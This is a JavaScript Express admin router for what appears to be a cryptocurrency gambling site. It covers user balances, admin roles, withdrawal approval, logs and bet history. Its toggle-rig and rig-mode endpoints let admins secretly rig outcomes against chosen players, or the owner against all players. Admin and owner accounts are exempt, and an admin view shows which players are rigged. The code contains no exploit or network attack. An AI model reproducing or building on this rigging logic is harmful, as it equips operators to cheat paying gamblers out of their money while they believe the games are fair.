import express from "express";
import { ensureAuth, ensureAdmin, ensureOwner } from "../middleware/auth.js";
import User from "../models/User.js";
import Deposit from "../models/Deposit.js";
import Withdrawal from "../models/Withdrawal.js";
import Transaction from "../models/Transaction.js";
import GameHistory from "../models/GameHistory.js";
import Settings from "../models/Settings.js";
import AdminLog from "../models/AdminLog.js";
import CryptoService from "../services/cryptoService.js";

const router = express.Router();

router.use(ensureAuth, ensureAdmin);

const logAction = async (req, action, targetUserId = null, targetUsername = null, details = null) => {
  await AdminLog.create({
    adminId: req.user._id,
    adminUsername: req.user.username,
    action,
    targetUserId,
    targetUsername,
    details
  });
};

router.get("/stats", async (req, res) => {
  try {
    const users = await User.getAll();
    const pendingWithdrawals = await Withdrawal.findPending();
    const pendingDeposits = await Deposit.findPending();
    const rigMode = await Settings.getRigMode();
    
    res.json({
      totalUsers: users.length,
      totalBalance: users.reduce((sum, u) => sum + u.balance, 0) / 100,
      pendingWithdrawals: pendingWithdrawals.length,
      pendingDeposits: pendingDeposits.length,
      rigMode,
      isOwner: req.user.isOwner
    });
  } catch (err) {
    console.error('Admin stats error:', err);
    res.status(500).json({ error: "Failed to fetch stats" });
  }
});

router.get("/users", async (req, res) => {
  try {
    const users = await User.getAll();
    res.json(users.map(u => ({
      id: u._id,
      username: u.username,
      email: u.email,
      balance: u.balance / 100,
      isAdmin: u.isAdmin,
      isOwner: u.isOwner,
      isRigged: u.isRigged,
      createdAt: u.created_at
    })));
  } catch (err) {
    res.status(500).json({ error: "Failed to fetch users" });
  }
});

router.post("/users/:userId/balance", async (req, res) => {
  try {
    const { userId } = req.params;
    const { amount, type } = req.body;
    
    const targetUser = await User.findById(userId);
    if (!targetUser) {
      return res.status(404).json({ error: "User not found" });
    }
    
    const amountCents = Math.round(parseFloat(amount) * 100);
    
    if (type === 'set') {
      await User.setBalance(userId, amountCents);
      await logAction(req, 'SET_BALANCE', userId, targetUser.username, `Set balance to $${amount}`);
    } else {
      await User.updateBalance(userId, amountCents);
      await logAction(req, amountCents >= 0 ? 'DEPOSIT_BALANCE' : 'WITHDRAW_BALANCE', userId, targetUser.username, `${amountCents >= 0 ? 'Added' : 'Removed'} $${Math.abs(amount)}`);
    }

    await Transaction.create({
      userId,
      type: 'adjustment',
      amountCents,
      referenceType: 'admin',
      referenceId: req.user._id
    });

    const user = await User.findById(userId);
    res.json({ success: true, newBalance: user.balance / 100 });
  } catch (err) {
    console.error('Balance update error:', err);
    res.status(500).json({ error: "Failed to update balance" });
  }
});

router.post("/users/:userId/toggle-rig", async (req, res) => {
  try {
    const { userId } = req.params;
    const targetUser = await User.findById(userId);
    
    if (!targetUser) {
      return res.status(404).json({ error: "User not found" });
    }
    
    if (targetUser.isOwner || targetUser.isAdmin) {
      return res.status(400).json({ error: "Cannot rig admin/owner accounts" });
    }
    
    const newRigStatus = !targetUser.isRigged;
    await User.setRigged(userId, newRigStatus);
    
    await logAction(req, newRigStatus ? 'ENABLE_RIG' : 'DISABLE_RIG', userId, targetUser.username, `Rig mode ${newRigStatus ? 'enabled' : 'disabled'}`);
    
    res.json({ success: true, isRigged: newRigStatus, message: `Rig mode ${newRigStatus ? 'enabled' : 'disabled'} for ${targetUser.username}` });
  } catch (err) {
    console.error('Toggle rig error:', err);
    res.status(500).json({ error: "Failed to toggle rig mode" });
  }
});

router.post("/users/:userId/make-admin", ensureOwner, async (req, res) => {
  try {
    const { userId } = req.params;
    const targetUser = await User.findById(userId);
    
    if (!targetUser) {
      return res.status(404).json({ error: "User not found" });
    }
    
    if (targetUser.isOwner) {
      return res.status(400).json({ error: "Cannot modify owner status" });
    }
    
    await User.makeAdmin(userId);
    await logAction(req, 'MAKE_ADMIN', userId, targetUser.username, 'Granted admin privileges');
    
    res.json({ success: true, message: `${targetUser.username} is now an admin` });
  } catch (err) {
    console.error('Make admin error:', err);
    res.status(500).json({ error: "Failed to update user" });
  }
});

router.post("/users/:userId/remove-admin", ensureOwner, async (req, res) => {
  try {
    const { userId } = req.params;
    const targetUser = await User.findById(userId);
    
    if (!targetUser) {
      return res.status(404).json({ error: "User not found" });
    }
    
    if (targetUser.isOwner) {
      return res.status(400).json({ error: "Cannot modify owner status" });
    }
    
    await User.removeAdmin(userId);
    await logAction(req, 'REMOVE_ADMIN', userId, targetUser.username, 'Removed admin privileges');
    
    res.json({ success: true, message: `${targetUser.username} is no longer an admin` });
  } catch (err) {
    console.error('Remove admin error:', err);
    res.status(500).json({ error: "Failed to update user" });
  }
});

router.post("/rig-mode", ensureOwner, async (req, res) => {
  try {
    const { enabled } = req.body;
    await Settings.setRigMode(enabled);
    await logAction(req, enabled ? 'ENABLE_GLOBAL_RIG' : 'DISABLE_GLOBAL_RIG', null, null, `Global rig mode ${enabled ? 'enabled' : 'disabled'}`);
    res.json({ success: true, rigMode: enabled });
  } catch (err) {
    console.error('Rig mode error:', err);
    res.status(500).json({ error: "Failed to update rig mode" });
  }
});

router.get("/rig-mode", async (req, res) => {
  try {
    const rigMode = await Settings.getRigMode();
    res.json({ rigMode, isOwner: req.user.isOwner });
  } catch (err) {
    res.status(500).json({ error: "Failed to get rig mode" });
  }
});

router.get("/logs", ensureOwner, async (req, res) => {
  try {
    const logs = await AdminLog.getAll(200);
    res.json(logs.map(l => ({
      id: l.id,
      adminUsername: l.admin_username,
      action: l.action,
      targetUsername: l.target_username,
      details: l.details,
      createdAt: l.created_at
    })));
  } catch (err) {
    console.error('Logs error:', err);
    res.status(500).json({ error: "Failed to fetch logs" });
  }
});

router.get("/withdrawals", async (req, res) => {
  try {
    const withdrawals = await Withdrawal.getAll();
    res.json(withdrawals.map(w => ({
      id: w.id,
      username: w.username,
      userId: w.user_id,
      currency: w.currency,
      amount: CryptoService.formatSatoshi(w.amount_satoshi, w.currency),
      amountSatoshi: w.amount_satoshi,
      address: w.address,
      status: w.status,
      requestedAt: w.requested_at,
      processedAt: w.processed_at,
      adminNotes: w.admin_notes
    })));
  } catch (err) {
    res.status(500).json({ error: "Failed to fetch withdrawals" });
  }
});

router.get("/withdrawals/pending", async (req, res) => {
  try {
    const withdrawals = await Withdrawal.findPending();
    res.json(withdrawals.map(w => ({
      id: w.id,
      username: w.username,
      userId: w.user_id,
      currency: w.currency,
      amount: CryptoService.formatSatoshi(w.amount_satoshi, w.currency),
      amountSatoshi: w.amount_satoshi,
      address: w.address,
      status: w.status,
      requestedAt: w.requested_at
    })));
  } catch (err) {
    res.status(500).json({ error: "Failed to fetch pending withdrawals" });
  }
});

router.post("/withdrawals/:id/approve", async (req, res) => {
  try {
    const { id } = req.params;
    const { notes } = req.body;
    
    const withdrawal = await Withdrawal.findById(id);
    if (!withdrawal) {
      return res.status(404).json({ error: "Withdrawal not found" });
    }

    await Withdrawal.approve(id, notes || 'Approved');
    await logAction(req, 'APPROVE_WITHDRAWAL', withdrawal.user_id, withdrawal.username, `Approved withdrawal of ${CryptoService.formatSatoshi(withdrawal.amount_satoshi, withdrawal.currency)}`);
    
    res.json({ 
      success: true, 
      message: "Withdrawal approved. Please send the crypto manually.",
      address: withdrawal.address,
      amount: CryptoService.formatSatoshi(withdrawal.amount_satoshi, withdrawal.currency)
    });
  } catch (err) {
    console.error('Withdrawal approve error:', err);
    res.status(500).json({ error: "Failed to approve withdrawal" });
  }
});

router.post("/withdrawals/:id/reject", async (req, res) => {
  try {
    const { id } = req.params;
    const { notes } = req.body;
    
    const withdrawal = await Withdrawal.findById(id);
    if (!withdrawal) {
      return res.status(404).json({ error: "Withdrawal not found" });
    }

    await User.updateBalance(withdrawal.user_id, 
      Math.round(CryptoService.satoshiToUsd(withdrawal.amount_satoshi, withdrawal.currency)));

    await Withdrawal.reject(id, notes || 'Rejected');
    await logAction(req, 'REJECT_WITHDRAWAL', withdrawal.user_id, withdrawal.username, `Rejected withdrawal: ${notes || 'No reason given'}`);
    
    res.json({ success: true, message: "Withdrawal rejected and balance refunded." });
  } catch (err) {
    console.error('Withdrawal reject error:', err);
    res.status(500).json({ error: "Failed to reject withdrawal" });
  }
});

router.post("/withdrawals/:id/complete", async (req, res) => {
  try {
    const { id } = req.params;
    const withdrawal = await Withdrawal.findById(id);
    await Withdrawal.complete(id);
    if (withdrawal) {
      await logAction(req, 'COMPLETE_WITHDRAWAL', withdrawal.user_id, withdrawal.username, 'Marked withdrawal as completed');
    }
    res.json({ success: true, message: "Withdrawal marked as completed." });
  } catch (err) {
    res.status(500).json({ error: "Failed to complete withdrawal" });
  }
});

router.get("/deposits", async (req, res) => {
  try {
    const deposits = await Deposit.getAll();
    res.json(deposits);
  } catch (err) {
    res.status(500).json({ error: "Failed to fetch deposits" });
  }
});

router.get("/transactions", async (req, res) => {
  try {
    const transactions = await Transaction.getAll(100);
    res.json(transactions);
  } catch (err) {
    res.status(500).json({ error: "Failed to fetch transactions" });
  }
});

router.get("/games", async (req, res) => {
  try {
    const games = await GameHistory.getRecentAll(100);
    res.json(games);
  } catch (err) {
    res.status(500).json({ error: "Failed to fetch game history" });
  }
});

router.get("/bets", async (req, res) => {
  try {
    const bets = await GameHistory.getRecentAll(100);
    res.json(bets.map(b => ({
      id: b.id,
      username: b.username,
      gameType: b.game_type,
      bet: b.bet_cents / 100,
      payout: b.payout_cents / 100,
      multiplier: b.multiplier,
      won: b.won,
      createdAt: b.created_at
    })));
  } catch (err) {
    res.status(500).json({ error: "Failed to fetch bets" });
  }
});

export default router;
